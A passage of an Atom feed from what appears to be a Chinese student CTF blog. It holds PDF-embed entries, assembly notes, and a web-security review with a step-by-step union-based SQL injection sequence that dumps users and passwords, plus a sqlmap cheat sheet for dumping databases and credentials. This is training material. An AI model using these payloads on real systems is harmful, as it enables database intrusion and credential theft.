    <title>2020GACTF_misc复现</title>
    <link href="https://www.damyahome.github.io/2020GACTF-misc%E5%A4%8D%E7%8E%B0/"/>
    <id>https://www.damyahome.github.io/2020GACTF-misc%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-09-23T13:01:40.000Z</published>
    <updated>2020-09-23T13:05:03.856Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="2020GACTF_misc复现.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;2020GACTF_misc复现.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;
	&lt;/div
      
    
    </summary>
    
    
      <category term="ctf writeup misc" scheme="https://www.damyahome.github.io/categories/ctf-writeup-misc/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>FCTF_wp</title>
    <link href="https://www.damyahome.github.io/FCTF-wp/"/>
    <id>https://www.damyahome.github.io/FCTF-wp/</id>
    <published>2020-09-23T11:51:04.000Z</published>
    <updated>2020-09-23T11:52:08.815Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="FCTF_wp.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;FCTF_wp.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;
	&lt;/div&gt;


&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2020DozerCTF_wp_by_ginkgo_三叶草</title>
    <link href="https://www.damyahome.github.io/2020DozerCTF-wp-by-ginkgo-%E4%B8%89%E5%8F%B6%E8%8D%89/"/>
    <id>https://www.damyahome.github.io/2020DozerCTF-wp-by-ginkgo-%E4%B8%89%E5%8F%B6%E8%8D%89/</id>
    <published>2020-09-23T11:37:34.000Z</published>
    <updated>2020-09-23T11:39:58.357Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="2020_DozerCTF_wp_by_ginkgo_三叶草.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;2020_DozerCTF_wp_by_ginkgo_三叶草.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;applicatio
      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="团队ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E5%9B%A2%E9%98%9Fctf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>第五周课堂笔记(汇编)</title>
    <link href="https://www.damyahome.github.io/%E7%AC%AC%E4%BA%94%E5%91%A8%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0-%E6%B1%87%E7%BC%96/"/>
    <id>https://www.damyahome.github.io/%E7%AC%AC%E4%BA%94%E5%91%A8%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0-%E6%B1%87%E7%BC%96/</id>
    <published>2020-04-04T10:37:30.000Z</published>
    <updated>2020-04-04T10:38:18.152Z</updated>
    
    <content type="html"><![CDATA[<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>主要寄存器:(32位)<br>EAX EBX ECX EDX:数据寄存器<br>ESI EDI:变址寄存器<br>ESP:指向栈顶<br>EBP:指向栈底<br>EIP:指向指令执行的下一条地址</p><p>R(64位)</p><p>（以上也是在栈中的位置顺序）</p><h2 id="常见的汇编指令"><a href="#常见的汇编指令" class="headerlink" title="常见的汇编指令"></a>常见的汇编指令</h2><p>mov eax,0x12  将0x12覆盖的存入eax<br>mov eax,ebx   将ebxd的值覆盖的存入eax<br>add eax，ebx  将ebx+eax并覆盖的存入eax<br>inc eax       eax++<br>edc eax       eax–</p><h2 id="PUSH"><a href="#PUSH" class="headerlink" title="PUSH"></a>PUSH</h2><p>push指令将操作数压入内存的栈中<br>个人理解：栈结构不变，push数据（压栈）前，先将esp值减4，再将操作数内容压入esp指示的位置，再自行+4恢复到栈顶位置<br>push eax    将eax内容压栈<br>push [var]  将var指示的4直接内容压栈</p><h2 id="POP"><a href="#POP" class="headerlink" title="POP"></a>POP</h2><p>pop指令与push指令相反,执行出栈工作<br>个人理解：栈结构不变，pop数据（出栈）前，先将esp指示地址中的内容出栈，然后esp值+4恢复栈顶位置<br>pop edi    将edi内容出栈<br>pop [ebx]  将ebx指示的4直接内容出栈</p><h2 id="CALL"><a href="#CALL" class="headerlink" title="CALL"></a>CALL</h2><p>call指令实现子程序的调用<br>个人理解：call指令先将当前执行指令地址入栈，然后无条件转移到由标签指示的指令，但依旧保存调用前的地址信息，当调用结束后返回到调用前的地址</p><h2 id="RET"><a href="#RET" class="headerlink" title="RET"></a>RET</h2><p>ret指令实现子程序的返回<br>个人理解：ret指令弹出栈中保存的指令地址，然后无条件转移到保存的指令地址执行，等待下一次返回数据</p><h2 id="调用约定画图理解"><a href="#调用约定画图理解" class="headerlink" title="调用约定画图理解"></a>调用约定画图理解</h2><figure class="image-box">                <img src="./pwn_pic.png" alt title class>                <p></p>            </figure><p>(以下纯个人理解,有不对的地方虚心听教)</p><p>main函数里定义A子程序,并赋值1,2,3,A子程序里返回a+b+c的值<br>old ebp是原栈底,一个保存原栈底地址的寄存器,内容可变结构不变<br>ret add返回由1,2,3赋值后的a+b+c,当有值被定义时就返回值,地址位置自行变化,功能不变<br>mov ebp,esp,有新内容进来,一个入栈过程,将ebp的地址转移到esp<br>leave,一个出栈过程,mov esp,ebp,将栈顶地址转移到栈底,pop出来一个ebp地址的内容,但因为已经将esp地址转移到ebp,所以pop ebp的内容依旧是在出栈,retn返回出栈的值</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;寄存器&quot;&gt;&lt;a href=&quot;#寄存器&quot; class=&quot;headerlink&quot; title=&quot;寄存器&quot;&gt;&lt;/a&gt;寄存器&lt;/h2&gt;&lt;p&gt;主要寄存器:(32位)&lt;br&gt;EAX EBX ECX EDX:数据寄存器&lt;br&gt;ESI EDI:变址寄存器&lt;br&gt;ESP:指向栈顶&lt;
      
    
    </summary>
    
    
      <category term="笔记" scheme="https://www.damyahome.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="汇编" scheme="https://www.damyahome.github.io/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>第一周复习(WEB)</title>
    <link href="https://www.damyahome.github.io/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%A4%8D%E4%B9%A0-WEB/"/>
    <id>https://www.damyahome.github.io/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%A4%8D%E4%B9%A0-WEB/</id>
    <published>2020-04-03T09:03:13.000Z</published>
    <updated>2020-04-03T09:05:37.148Z</updated>
    
    <content type="html"><![CDATA[<p>线上分享第一周主要以复习为主，在家估计都把原来学的忘的差不多了，所有人各个方向，这周提前复习一下HTTP协议（传参类型、常用伪造形式、各个文件头的大概作用、burp/postman/hackbar工具熟悉使用）html基础（web页面、常用标签、自己编写内容）、sql基础（mysql语言学习、增删改查、联合查询的方式、基础的sql注入点挖掘、sqlmap使用）这些内容提前复习，在分享会时候会让各位都进行实操和讲解，对不会的地方进行详细讲解，保证大部分人的时间不浪费</p><h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><h3 id="传参类型"><a href="#传参类型" class="headerlink" title="传参类型"></a>传参类型</h3><p>GET POST(辅助工具 hackbar burpsuite postman)</p><h3 id="常用伪造形式"><a href="#常用伪造形式" class="headerlink" title="常用伪造形式"></a>常用伪造形式</h3><p>X-Forwarded-For： 伪造请求的ip</p><p>User-Agent: 伪造应用信息</p><p>Accept-Language: 伪造请求语言</p><p>Host： 伪造请求的服务器的ip</p><p>GET/POST: 伪造发包方式</p><h3 id="常见攻击形式"><a href="#常见攻击形式" class="headerlink" title="常见攻击形式"></a>常见攻击形式</h3><p>跨站脚本攻击(XSS) 跨站请求伪造攻击(CSRF) Http Heads攻击 Cookie攻击 重定向攻击</p><h3 id="数据包文件头的作用"><a href="#数据包文件头的作用" class="headerlink" title="数据包文件头的作用"></a>数据包文件头的作用</h3><h4 id="通用头部"><a href="#通用头部" class="headerlink" title="通用头部"></a>通用头部</h4><p>Request URL: 请求地址</p><p>Request Method: 请求方式（get post put delete trace header）</p><p>Status Code: 200 (状态码和原因短语)</p><p>Remote Address: 127.0.0.1:80 （请求ip）</p><p>Referrer Policy: no-referrer-when-downgrade(是否有代理)</p><h4 id="响应头部"><a href="#响应头部" class="headerlink" title="响应头部"></a>响应头部</h4><p>Connection: 连接</p><p>Content-Type: application/json;charset=UTF-8（内容类型）</p><p>Date: Mon, 24 Jun 2019 11:12:18 GMT（做出响应的时间）</p><p>Server: nginx/1.13.6 （服务器类型）</p><p>Transfer-Encoding: chunked （消息首部指明将信息安全传递给用户所采用的编码形）</p><h4 id="请求头部"><a href="#请求头部" class="headerlink" title="请求头部"></a>请求头部</h4><p>Accept: application/json, text/plain, / （接收类型）</p><p>Accept-Encoding: gzip, deflate （接收压缩内容使用的编码）</p><p>Accept-Language: zh-CN,zh;q=0.9 （接收语言）</p><p>Connection: keep-alive （连接成功）</p><p>Cookie: JSESSIONID=0AC68B437A980871D1E6C4479DCCF965 (COOKIE信息)</p><p>Host: <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> （响应主机域名）</p><p>Referer: <a href="http://www.baidu.com" target="_blank" rel="noopener">http://www.baidu.com</a> (响应地址)</p><p>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36 （浏览器应用信息)</p><h4 id="实体头部包含发出请求的参数信息"><a href="#实体头部包含发出请求的参数信息" class="headerlink" title="实体头部包含发出请求的参数信息."></a>实体头部包含发出请求的参数信息.</h4><h3 id="burp-postman-hackbar工具熟悉使用"><a href="#burp-postman-hackbar工具熟悉使用" class="headerlink" title="burp/postman/hackbar工具熟悉使用"></a>burp/postman/hackbar工具熟悉使用</h3><h4 id="burpsuite常用功能"><a href="#burpsuite常用功能" class="headerlink" title="burpsuite常用功能"></a>burpsuite常用功能</h4><p>proxy:抓包</p><p>spider:爬虫</p><p>intruder:爆破密码</p><p>repeater:发包改包</p><p>extender:添加插件</p><h4 id="postman"><a href="#postman" class="headerlink" title="postman"></a>postman</h4><figure class="image-box">                <img src="https://img-blog.csdn.net/20180523232921542?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Z4YmluMTIz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt title class>                <p></p>            </figure><p><a href="https://blog.csdn.net/fxbin123/article/details/80428216" target="_blank" rel="noopener">详细使用</a></p><h4 id="hackbar"><a href="#hackbar" class="headerlink" title="hackbar"></a>hackbar</h4><p>有多种注入方式可用xss,sql等,支持get,post传参,带http协议头传参等.</p><h2 id="html基础"><a href="#html基础" class="headerlink" title="html基础"></a>html基础</h2><h3 id="web页面"><a href="#web页面" class="headerlink" title="web页面"></a>web页面</h3><p>随便找一个页面都能说.</p><h3 id="常用标签"><a href="#常用标签" class="headerlink" title="常用标签"></a>常用标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;head&gt;&lt;meta&gt;&lt;link&gt;&lt;title&gt;&lt;body&gt;&lt;div&gt;&lt;textarea&gt;&lt;span&gt;等</span><br></pre></td></tr></table></figure><h3 id="自己编写内容"><a href="#自己编写内容" class="headerlink" title="自己编写内容"></a>自己编写内容</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"./index.html#onepage"</span>&gt;</span>新番资讯<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#twopage"</span>&gt;</span>我的追番<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"./threepage.html#threepage"</span>&gt;</span>番剧推荐<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"move"</span>&gt;</span> <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 动漫资讯 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"contain"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sildeInput"</span> <span class="attr">value</span>=<span class="string">"1"</span> <span class="attr">id</span>=<span class="string">"Input1"</span> <span class="attr">hidden</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"label1"</span> <span class="attr">for</span>=<span class="string">"Input1"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sildeInput"</span> <span class="attr">value</span>=<span class="string">"1"</span> <span class="attr">id</span>=<span class="string">"Input2"</span> <span class="attr">hidden</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"label2"</span> <span class="attr">for</span>=<span class="string">"Input2"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sildeInput"</span> <span class="attr">value</span>=<span class="string">"0"</span> <span class="attr">id</span>=<span class="string">"Input3"</span> <span class="attr">hidden</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"label3"</span> <span class="attr">for</span>=<span class="string">"Input3"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./images/bg.jpg"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./images/bg.jpg"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"./images/bg.jpg"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="sql基础"><a href="#sql基础" class="headerlink" title="sql基础"></a>sql基础</h2><h3 id="mysql语言学习"><a href="#mysql语言学习" class="headerlink" title="mysql语言学习"></a>mysql语言学习</h3><h4 id="最常用的显示命令"><a href="#最常用的显示命令" class="headerlink" title="最常用的显示命令"></a>最常用的显示命令</h4><p>1、显示数据库列表:</p><p>show databases;</p><p>2、显示库中的数据表：</p><p>use mysql;</p><p>show tables;</p><p>3、显示数据表的结构：</p><p>describe 表名;</p><p>4、建库：</p><p>create database 库名;</p><p>5、建表：</p><p>use 库名；</p><p>create table 表名;</p><p>6、删库和删表:</p><p>drop database 库名;</p><p>drop table 表名;</p><p>7、将表中记录清空：</p><p>delete from 表名;(清空数据表内容,保留自增id,可恢复)</p><p>truncate table 表名;（成功则返回0,自增id也一同会被清掉,不可恢复）</p><p>8、显示表中的记录：</p><p>select * from 表名;</p><p>9、显示当前的user：</p><p>SELECT USER();</p><h4 id="连接MySQL"><a href="#连接MySQL" class="headerlink" title="连接MySQL"></a>连接MySQL</h4><p>格式: mysql -h 主机地址 -u用户名 -p用户密码</p><p>退出MYSQL命令： exit （回车）</p><h4 id="修改新密码"><a href="#修改新密码" class="headerlink" title="修改新密码"></a>修改新密码</h4><p>方法一<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">update user set password=PASSWORD(&apos;新密码&apos;) where user=&apos;用户名&apos;;</span><br><span class="line">flush privileges; #有关用户变动的都需要更新权限</span><br><span class="line">quit; #退出</span><br></pre></td></tr></table></figure></p><p>方法二</p><p>格式：mysqladmin -u用户名 -p旧密码 password 新密码</p><h4 id="增加新用户"><a href="#增加新用户" class="headerlink" title="增加新用户"></a>增加新用户</h4><p>格式：grant select on 数据库.* to 用户名@登录主机 identified by “密码”</p><p>如增加一个用户test2密码为abc,让他只可以在localhost上登录,并可以对数据库mydb进行查询、插入、修改、删除的操作（localhost指本地主机,即MYSQL数据库所在的那台主机）,这样用户即使用知道test2的密码也无法从internet上直接访问数据库,只能通过MYSQL主机上的web页来访问.</p><p>grant select,insert,update,delete on mydb.* to test2@localhost identified by “abc”;</p><h4 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h4><p>格式: delete from user where user=’用户名’ and host=’localhost’;</p><p>删除用户的数据库: drop database dbname;</p><h3 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h3><h4 id="增"><a href="#增" class="headerlink" title="增"></a>增</h4><p>命令:alter table 表名 add 字段 类型 其他;</p><p>alter table MyClass add passtest int(4) default ‘0’</p><h4 id="删"><a href="#删" class="headerlink" title="删"></a>删</h4><p>命令:delete from 表名 where 表达式</p><p>delete from MyClass where id=1;</p><h4 id="改"><a href="#改" class="headerlink" title="改"></a>改</h4><p>命令:update 表名 set 字段=新值,… where 条件</p><p>update MyClass set name=’Mary’ where id=1;</p><h4 id="查"><a href="#查" class="headerlink" title="查"></a>查</h4><p>查询所有行</p><p>mysql&gt; select * from MyClass;</p><p>查询前几行数据</p><p>mysql&gt; select * from MyClass order by id limit 0,2;</p><h3 id="联合查询的方式"><a href="#联合查询的方式" class="headerlink" title="联合查询的方式"></a>联合查询的方式</h3><h4 id="联合查询的注意事项"><a href="#联合查询的注意事项" class="headerlink" title="联合查询的注意事项:"></a>联合查询的注意事项:</h4><p>1.两个查询语句的查询结果中的列类型要一样。</p><p>2.两个查询语句的查询结果中的列的数量要相同。</p><p>3.两个查询语句的查询结果中的列名可以不一致，如果没有特定指定，按照第一个查询语句的列名来显示。</p><h4 id="联合注入的过程"><a href="#联合注入的过程" class="headerlink" title="联合注入的过程"></a>联合注入的过程</h4><p>1.判断注入点   ?id=1 and 1=1  ?id=1’</p><p>2.判断是整型还是字符型   ?id=1 and 1=1/1=2%23</p><p>3.判断查询列数  ?id=1’ order by 4%23</p><p>4.判断显示位  ?id=-1’ union select 1,2,3%23</p><p>5.获取所有数据库名<br>?id=-1’ union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)%23</p><p>6.获取数据库所有表名<br>?id=-1’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3%23</p><p>7.获取列名<br>?id=-1’ union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=’security’ and table_name=’users’),3%23</p><p>8.获取字段名<br>?id=-1’ union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 1,1),3%23 </p><h3 id="基础的sql注入点挖掘"><a href="#基础的sql注入点挖掘" class="headerlink" title="基础的sql注入点挖掘"></a>基础的sql注入点挖掘</h3><p>1.单引号判断  ?id=1’</p><p>2.数字型判断  ?id=1 and 1=1/1=2  id=123-1</p><p>3.字符型判断  ?id=1’ and ‘1’=’1/2</p><p>4.文本型判断  ?id=123’%2B’asdf</p><p>5.输入框判断  #@!$/ …</p><h3 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u url --dbs //爆数据库</span><br><span class="line">sqlmap.py -u url --current-db //爆当前库</span><br><span class="line">sqlmap.py -u url --current-user //爆当前用户</span><br><span class="line">sqlmap.py -u url --users   查看用户权限</span><br><span class="line">sqlmap.py -u url --tables -D 数据库 //爆表段</span><br><span class="line">sqlmap.py -u url --columns -T 表段 -D 数据库 //爆字段</span><br><span class="line">sqlmap.py -u url --dump -C 字段 -T 表段 -D 数据库 //猜解</span><br><span class="line">sqlmap.py -u url --dump --start=1 --stop=3 -C 字段 -T 表段 -D 数据库 //猜解1到3的字段</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url  判断</span><br><span class="line">sqlmap.py -u url --is-dba -v   这是判断当前数据库的使用者是否是dba</span><br><span class="line">sqlmap.py -u url --users -v 0  这句的目的是列举数据库的用户</span><br><span class="line">sqlmap.py -u url --passwords -v 0 这句的目的是获取数据库用户的密码</span><br><span class="line">sqlmap.py -u url --privileges -v 0 这是判断当前的权限</span><br><span class="line">sqlmap.py -u url --dbs -v 0 这句的目的是将所有的数据库列出来</span><br><span class="line">sqlmap.py -u url --tables -D &apos;表&apos; 爆表</span><br><span class="line">sqlmap.py -u url --columns -T ‘表’-D ‘数据库’爆列</span><br><span class="line">sqlmap.py -u url --dump -T &apos;表&apos; --start 1 --stop 4 -v 0 这里是查询第2到第4行的内</span><br><span class="line">sqlmap.py -u url --dump -all -v 0</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;线上分享第一周主要以复习为主，在家估计都把原来学的忘的差不多了，所有人各个方向，这周提前复习一下HTTP协议（传参类型、常用伪造形式、各个文件头的大概作用、burp/postman/hackbar工具熟悉使用）html基础（web页面、常用标签、自己编写内容）、sql基础（
      
    
    </summary>
    
    
      <category term="笔记" scheme="https://www.damyahome.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="WEB知识" scheme="https://www.damyahome.github.io/tags/WEB%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>第四周两道题wp(SQL注入)</title>
    <link href="https://www.damyahome.github.io/%E7%AC%AC%E5%9B%9B%E5%91%A8%E4%B8%A4%E9%81%93%E9%A2%98wp-SQL%E6%B3%A8%E5%85%A5/"/>
    <id>https://www.damyahome.github.io/%E7%AC%AC%E5%9B%9B%E5%91%A8%E4%B8%A4%E9%81%93%E9%A2%98wp-SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2020-04-03T08:59:39.000Z</published>
    <updated>2020-04-03T09:00:40.205Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="第四周两道题wp(SQL注入).pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;第四周两道题wp(SQL注入).pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;
	&lt;/div&gt;
      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="sql注入" scheme="https://www.damyahome.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>第二周四道题wp(代码审计)</title>
    <link href="https://www.damyahome.github.io/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%9B%9B%E9%81%93%E9%A2%98wp/"/>
    <id>https://www.damyahome.github.io/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%9B%9B%E9%81%93%E9%A2%98wp/</id>
    <published>2020-03-13T15:24:35.000Z</published>
    <updated>2020-04-03T08:58:18.575Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="第二周四道题wp.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;第二周四道题wp.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;
	&lt;/div&gt;


&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="sql注入" scheme="https://www.damyahome.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>2020高校战疫CTF wp</title>
    <link href="https://www.damyahome.github.io/2020%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%ABCTF-wp/"/>
    <id>https://www.damyahome.github.io/2020%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%ABCTF-wp/</id>
    <published>2020-03-10T02:18:21.000Z</published>
    <updated>2020-03-10T02:20:53.574Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="2020高校战疫CTF__wp.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;2020高校战疫CTF__wp.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;
	&lt;/div&gt;
      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>GXYCTF writeup Mini_Ginkgo</title>
    <link href="https://www.damyahome.github.io/GXYCTF-writeup-Mini-Ginkgo/"/>
    <id>https://www.damyahome.github.io/GXYCTF-writeup-Mini-Ginkgo/</id>
    <published>2020-01-02T13:31:42.000Z</published>
    <updated>2020-01-03T13:21:39.270Z</updated>
    
    <content type="html"><![CDATA[<p>pdf插件加载比较慢,请稍等一下下哈<br><div class="row">    <embed src="GXYCTF_writeup_Mini_Ginkgo.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pdf插件加载比较慢,请稍等一下下哈&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
